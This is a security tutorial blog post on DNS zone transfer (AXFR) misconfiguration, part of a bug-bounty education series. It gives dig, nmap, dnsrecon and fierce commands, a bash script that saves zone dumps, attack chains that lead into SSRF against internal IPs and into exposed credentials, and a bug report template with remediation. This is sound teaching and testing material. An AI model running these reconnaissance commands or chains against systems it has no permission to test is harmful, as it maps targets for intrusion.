# DNS Zone Transfer (AXFR): One Command That Exposes Your Entire Infrastructure

**Severity:** HIGH | **Category:** Recon | **Series:** #300DaysWithAppSec

---

## The Vulnerability That Hands You Everything

Imagine you're a burglar. Instead of checking each door and window one by one, you find a button that prints out a complete blueprint of the building — every room, every door, every entry point, every person inside.

That's what a DNS Zone Transfer misconfiguration does to an attacker.

In a single command, you can retrieve every single DNS record a company has — every subdomain, every server IP, every mail server, every internal hostname. It's one of the highest ROI vulnerabilities in recon because the fix takes 2 minutes, yet thousands of companies still have it misconfigured.

---

## Understanding DNS — The Foundation

Before we talk about the attack, you need to understand how DNS actually works.

**DNS (Domain Name System)** is like the internet's phone book. When you type `google.com` into your browser, your computer asks a DNS server: "What's the IP address of google.com?" The DNS server replies "142.250.195.46" and your browser connects to that IP.

### DNS Records — The Building Blocks

DNS doesn't just store IP addresses. It stores different types of records:

```
A Record:    api.target.com        → 10.20.30.40    (IPv4 address)
AAAA Record: api.target.com        → 2001:db8::1    (IPv6 address)
MX Record:   target.com            → mail.target.com (email server)
CNAME:       www.target.com        → target.com      (alias)
TXT Record:  target.com            → "v=spf1 include:..."  (text data)
NS Record:   target.com            → ns1.cloudflare.com    (nameserver)
```

All of these records together for a domain are called a **DNS Zone**.

### What Is a Zone Transfer?

Companies often have multiple DNS servers — a primary server where changes are made, and secondary servers that serve as backups. To keep all secondary servers in sync with the primary, DNS has a mechanism called a **Zone Transfer (AXFR)** — it copies ALL records from the primary to the secondary.

The problem: if the DNS server is misconfigured to allow **anyone** (not just secondary servers) to request a zone transfer, attackers can download the entire DNS zone.

---

## Why This Is HIGH Severity

The data you get from a successful zone transfer is extremely valuable for attackers:

**1. Complete Subdomain Map (Better Than Enumeration)**
Instead of guessing subdomains with wordlists, you get EVERY subdomain instantly:
```
dev.target.com          → development server
staging.target.com      → pre-production
jenkins.target.com      → CI/CD pipeline
vault.internal.com      → secrets management server
db-master.target.com    → primary database server
redis.target.com        → cache server
```

**2. Internal IP Addresses**
```
api.target.com    IN A    10.0.0.5     ← internal IP revealed
db.target.com     IN A    10.0.0.10    ← database server IP
vpn.target.com    IN A    10.0.0.1     ← VPN gateway
```

These internal IPs help with SSRF attacks, internal port scanning, and mapping the internal network.

**3. Mail Server Configuration**
```
target.com    IN MX    10 mail.target.com
```
Attackers use this to craft targeted phishing emails that look exactly like they came from the company's email system.

**4. Hidden and Forgotten Services**
```
old-api.target.com      IN A    10.0.0.99   ← old API, probably vulnerable
test-admin.target.com   IN A    10.0.0.15   ← test admin panel, likely weak creds
```

---

## How to Test for AXFR Misconfiguration

### Step 1: Find the Nameservers

Before you can request a zone transfer, you need to know which DNS servers are authoritative for the domain.

```bash
# Using dig
dig NS target.com

# Output:
# target.com.    IN NS    ns1.target.com.
# target.com.    IN NS    ns2.target.com.
# target.com.    IN NS    ns3.target.com.

# Using nslookup
nslookup -type=NS target.com

# Using host
host -t NS target.com
```

You now know the nameservers: `ns1.target.com`, `ns2.target.com`, `ns3.target.com`.

### Step 2: Attempt the Zone Transfer

```bash
# Basic AXFR attempt with dig
# Syntax: dig AXFR domain @nameserver
dig AXFR target.com @ns1.target.com
dig AXFR target.com @ns2.target.com
dig AXFR target.com @ns3.target.com

# Try each nameserver — some may be misconfigured even if others aren't
```

### Step 3: Interpreting the Results

**Vulnerable response (zone transfer succeeds):**
```
; <<>> DiG 9.18.0 <<>> AXFR target.com @ns1.target.com
;; global options: +cmd
target.com.          3600  IN  SOA   ns1.target.com. admin.target.com. 2023010101 3600 900 604800 300
target.com.          3600  IN  NS    ns1.target.com.
target.com.          3600  IN  NS    ns2.target.com.
target.com.          3600  IN  A     93.184.216.34
www.target.com.      3600  IN  CNAME target.com.
api.target.com.      3600  IN  A     10.0.0.5        ← INTERNAL IP!
admin.target.com.    3600  IN  A     10.0.0.10
dev.target.com.      3600  IN  A     10.0.0.15
mail.target.com.     3600  IN  A     10.0.0.20
vpn.target.com.      3600  IN  A     10.0.0.1
jenkins.target.com.  3600  IN  A     10.0.0.25
db.target.com.       3600  IN  A     10.0.0.30       ← DATABASE SERVER!
target.com.          3600  IN  SOA   ns1.target.com. ...
;; Query time: 15 msec
;; Transfer complete.                                  ← ZONE TRANSFER SUCCEEDED!
```

**Secure response (transfer denied):**
```
; <<>> DiG 9.18.0 <<>> AXFR target.com @ns1.target.com
; Transfer failed.
```

---

## Automation Tools

### dnsrecon (Most Complete)

```bash
# Install
pip3 install dnsrecon --break-system-packages

# Test zone transfer specifically
dnsrecon -d target.com -t axfr

# Full recon including AXFR
dnsrecon -d target.com -a -s
```

### fierce (Combined Brute Force + AXFR)

```bash
# Install
pip3 install fierce --break-system-packages

# Runs AXFR attempt + brute force if AXFR fails
fierce --domain target.com
```

### nmap (Network Scan + DNS Script)

```bash
# nmap has a built-in DNS zone transfer NSE script
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.com ns1.target.com

# Scan entire /24 for open DNS servers that allow zone transfer
nmap -p 53 --script dns-zone-transfer 10.0.0.0/24
```

### One-Liner Full Test

```bash
#!/bin/bash
DOMAIN="${1:-target.com}"

echo "=== Testing Zone Transfer for $DOMAIN ==="

# Get nameservers
NS_SERVERS=$(dig NS $DOMAIN +short)
echo "Nameservers found:"
echo "$NS_SERVERS"
echo ""

# Test each nameserver
for ns in $NS_SERVERS; do
    ns_clean="${ns%.}"  # remove trailing dot
    echo "Testing: $ns_clean"
    result=$(dig AXFR $DOMAIN @$ns_clean 2>&1)
    
    if echo "$result" | grep -q "Transfer complete"; then
        echo "!!! VULNERABLE: Zone transfer succeeded on $ns_clean !!!"
        echo "$result" > "axfr_dump_${ns_clean}.txt"
        echo "Full dump saved to axfr_dump_${ns_clean}.txt"
    else
        echo "Protected: $ns_clean rejected zone transfer"
    fi
    echo ""
done
```

---

## Chaining AXFR with Other Attacks

Getting a zone transfer is just the start. Here's how hunters chain it into bigger findings:

### Chain 1: AXFR → Internal IP Discovery → SSRF

```
1. AXFR reveals: db.target.com → 10.0.0.30
2. Target's API endpoint accepts a URL parameter
3. POST /api/fetch {"url": "http://10.0.0.30:5432"} ← now you know this IP!
4. SSRF to internal database server → HIGH/CRITICAL
```

### Chain 2: AXFR → Shadow API Discovery → BOLA/BFLA

```
1. AXFR reveals: api-v1.target.com (old, undocumented API)
2. Test api-v1.target.com with admin endpoints
3. No authentication on admin endpoints → BFLA → CRITICAL
```

### Chain 3: AXFR → Dev Server Discovery → Credential Access

```
1. AXFR reveals: dev.target.com
2. Dev server has Django debug mode ON
3. Error pages expose SECRET_KEY and DB credentials → CRITICAL
```

---

## The Bug Report

When you find a successful zone transfer, document it properly:

```
Title: DNS Zone Transfer (AXFR) Misconfiguration — ns1.target.com

Severity: HIGH

CVSS Score: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

Description:
The DNS nameserver ns1.target.com allows unauthenticated zone transfer 
requests (AXFR) from any IP address. This enables any internet user to 
retrieve the complete DNS zone file for target.com, exposing all 
subdomains, server IP addresses, internal hostnames, and mail server 
configurations.

Steps to Reproduce:
1. Identify nameservers: dig NS target.com
2. Request zone transfer: dig AXFR target.com @ns1.target.com
3. Observe: complete DNS zone returned including internal hostnames

Proof of Concept:
[Include the full dig AXFR output showing leaked records]

Sensitive Data Exposed:
- db.target.com → 10.0.0.30 (internal database server IP)
- jenkins.target.com → 10.0.0.25 (CI/CD pipeline server)
- [List all sensitive findings from the dump]

Impact:
Complete DNS infrastructure exposure. Internal server IPs and 
hostnames enable targeted attacks against internal services, 
facilitate SSRF attacks against internal endpoints, and reveal 
the full attack surface including forgotten and legacy systems.

Remediation:
Configure the DNS server to only allow zone transfers from 
specific secondary nameserver IP addresses, not from all sources.
In BIND: "allow-transfer { 10.x.x.x; };" in zone configuration.

References:
- RFC 5936: DNS Zone Transfer Protocol (AXFR)
```

---

## Key Takeaways

```
1. Zone transfer = single command that dumps entire DNS zone
2. Test ALL nameservers — some may be misconfigured even if others aren't
3. Use dig AXFR first — it's built-in, no install needed
4. Automate with dnsrecon for comprehensive testing
5. AXFR data is the foundation for finding internal services
6. Always chain AXFR findings with follow-up testing on discovered assets
7. Even if AXFR is blocked, the attempt itself reveals nameserver versions
```

---

*Written by Anand Prajapati — Penetration Tester & Security Researcher*

🔗 **Connect:**
- LinkedIn: [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369)
- GitHub: [github.com/anand87794](https://github.com/anand87794)
- Portfolio: [anandprajapati.lovable.app](https://anandprajapati.lovable.app)
- X (Twitter): [@anand87794](https://x.com/anand87794)

*Part of the #300DaysWithAppSec series — 300 vulnerabilities, 300 posts, real security education.*
